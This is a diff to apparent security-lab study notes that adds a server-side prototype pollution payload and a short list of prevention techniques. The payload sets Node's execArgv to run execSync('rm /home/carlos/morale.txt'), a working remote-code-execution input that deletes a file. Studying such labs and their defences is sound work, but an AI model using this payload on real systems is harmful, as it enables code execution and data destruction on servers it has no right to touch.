@@ -78,4 +78,27 @@ Defense: set `__proto__` is not permitted.
 ```
 
 
+## Lab: Remote code execution via server-side prototype pollution
+
+```js
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
+    ]
+}
+```
+
+
+## Prototype Pollution Prevention
+1. Sanitizing property keys
+2. Preventing changes to prototype objects: `Object.freeze(Object.prototype)`
+3. Preventing an object from inheriting properties: `let myObject = Object.create(null)`
+4. Using safer alternatives where possible, e.g. `Set` and `Map`
+
+
+
+
+
+
+
 
